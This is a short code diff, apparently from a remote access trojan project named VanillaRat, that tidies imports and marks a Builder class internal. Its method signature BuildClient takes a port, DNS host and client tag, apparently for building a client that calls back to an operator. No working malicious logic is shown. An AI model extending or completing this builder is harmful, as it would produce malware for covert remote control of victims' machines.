@@ -1,15 +1,11 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using dnlib.DotNet;
+using System;
 using System.IO;
 using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using dnlib.DotNet;
-using dnlib.DotNet.Emit;
 
 namespace VanillaRat.Classes
 {
-    class Builder
+    internal class Builder
     {
         public void BuildClient(string Port, string DNS, string Name, string ClientTag, string UpdateInterval)
         {
